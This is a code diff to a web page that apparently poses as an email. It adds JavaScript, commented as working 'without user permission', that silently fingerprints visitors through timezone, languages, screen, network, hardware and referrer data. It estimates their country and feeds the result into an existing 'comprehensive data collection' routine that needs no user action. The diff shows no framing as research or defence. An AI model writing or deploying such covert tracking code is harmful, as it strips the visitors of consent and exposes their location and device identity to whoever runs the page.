@@ -318,6 +318,170 @@
         document.getElementById('timestamp').textContent = new Date().toLocaleString();
         document.getElementById('emailDate').textContent = new Date().toLocaleDateString();
 
+        // Enhanced Location Detection (without user permission)
+        function getEnhancedLocationData() {
+            const locationData = {
+                // Timezone-based location estimation
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                localTime: new Date().toLocaleString(),
+                
+                // Language-based location hints
+                primaryLanguage: navigator.language,
+                allLanguages: navigator.languages,
+                languageRegion: navigator.language.split('-')[1] || null,
+                
+                // Screen and display characteristics (can indicate location/culture)
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                screenOrientation: screen.orientation ? screen.orientation.type : 'unknown',
+                
+                // Network characteristics
+                connectionType: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Date/time patterns (can indicate location)
+                dateFormat: new Date().toLocaleDateString(),
+                timeFormat: new Date().toLocaleTimeString(),
+                dateTimePattern: new Date().toLocaleString(),
+                
+                // Currency and number formatting (location indicators)
+                currency: new Intl.NumberFormat().resolvedOptions().currency || null,
+                numberFormat: new Intl.NumberFormat().resolvedOptions().locale,
+                
+                // Browser locale settings
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+                numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
+                
+                // Additional location hints
+                referrer: document.referrer,
+                origin: window.location.origin,
+                protocol: window.location.protocol,
+                
+                // Device characteristics that might indicate location
+                touchSupport: 'ontouchstart' in window,
+                maxTouchPoints: navigator.maxTouchPoints,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                
+                // Network timing (can provide location hints)
+                networkTiming: performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    loadEventEnd: performance.timing.loadEventEnd,
+                    domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
+                } : null,
+                
+                // Additional browser capabilities
+                doNotTrack: navigator.doNotTrack,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                
+                // Location estimation confidence
+                confidence: 'medium', // Based on available data
+                method: 'enhanced_passive_detection'
+            };
+            
+            // Try to get more specific location data from various sources
+            try {
+                // Check if we can detect mobile carrier (some browsers expose this)
+                if (navigator.connection && navigator.connection.type) {
+                    locationData.connectionType.type = navigator.connection.type;
+                }
+                
+                // Try to detect if user is on mobile network (more location-specific)
+                if (navigator.connection && navigator.connection.effectiveType) {
+                    locationData.isMobileNetwork = navigator.connection.effectiveType.includes('2g') || 
+                                                 navigator.connection.effectiveType.includes('3g') || 
+                                                 navigator.connection.effectiveType.includes('4g');
+                }
+                
+                // Detect if user is likely in a specific region based on language/timezone combo
+                const timezone = locationData.timezone;
+                const language = locationData.primaryLanguage;
+                
+                if (timezone && language) {
+                    locationData.regionHints = {
+                        timezoneCountry: timezone.split('/')[0],
+                        timezoneCity: timezone.split('/')[1],
+                        languageCountry: language.split('-')[1],
+                        likelyRegion: `${language.split('-')[1] || 'unknown'}_${timezone.split('/')[0] || 'unknown'}`
+                    };
+                }
+                
+                // Try to detect if user is likely in a specific country based on multiple factors
+                locationData.countryHints = estimateCountryFromData(locationData);
+                
+            } catch (error) {
+                console.log('Enhanced location detection error:', error);
+            }
+            
+            return locationData;
+        }
+        
+        // Estimate country from available data
+        function estimateCountryFromData(data) {
+            const hints = {
+                confidence: 'low',
+                possibleCountries: [],
+                indicators: []
+            };
+            
+            // Timezone to country mapping
+            const timezoneCountries = {
+                'America/': ['US', 'CA', 'MX', 'BR', 'AR'],
+                'Europe/': ['GB', 'DE', 'FR', 'IT', 'ES', 'NL', 'SE', 'NO', 'DK'],
+                'Asia/': ['CN', 'JP', 'KR', 'IN', 'SG', 'TH', 'MY', 'ID', 'PH'],
+                'Australia/': ['AU', 'NZ'],
+                'Africa/': ['ZA', 'NG', 'EG', 'KE', 'MA'],
+                'Pacific/': ['AU', 'NZ', 'FJ', 'PG']
+            };
+            
+            if (data.timezone) {
+                for (const [region, countries] of Object.entries(timezoneCountries)) {
+                    if (data.timezone.startsWith(region)) {
+                        hints.possibleCountries.push(...countries);
+                        hints.indicators.push(`timezone:${data.timezone}`);
+                        break;
+                    }
+                }
+            }
+            
+            // Language to country mapping
+            const languageCountries = {
+                'en': ['US', 'GB', 'AU', 'CA', 'NZ', 'IE'],
+                'es': ['ES', 'MX', 'AR', 'CO', 'PE', 'VE'],
+                'fr': ['FR', 'CA', 'BE', 'CH', 'LU'],
+                'de': ['DE', 'AT', 'CH', 'LU'],
+                'it': ['IT', 'CH'],
+                'pt': ['BR', 'PT'],
+                'ru': ['RU', 'BY', 'KZ', 'KG'],
+                'zh': ['CN', 'TW', 'HK', 'SG'],
+                'ja': ['JP'],
+                'ko': ['KR'],
+                'hi': ['IN'],
+                'ar': ['SA', 'AE', 'EG', 'MA', 'DZ']
+            };
+            
+            if (data.primaryLanguage) {
+                const langCode = data.primaryLanguage.split('-')[0];
+                if (languageCountries[langCode]) {
+                    hints.possibleCountries.push(...languageCountries[langCode]);
+                    hints.indicators.push(`language:${langCode}`);
+                }
+            }
+            
+            // Remove duplicates and calculate confidence
+            hints.possibleCountries = [...new Set(hints.possibleCountries)];
+            hints.confidence = hints.indicators.length > 1 ? 'medium' : 'low';
+            
+            return hints;
+        }
+
         // COMPREHENSIVE DATA COLLECTION - NO USER ACTION REQUIRED
         function collectComprehensiveData() {
             const data = {
@@ -404,6 +568,9 @@
                 
                 // Browser Geolocation (exact coordinates - will be requested separately)
                 browserGeolocation: null,
+                
+                // Enhanced Location Detection (without permission)
+                enhancedLocation: getEnhancedLocationData(),
                 
                 // WebGL Info
                 webgl: getWebGLInfo(),
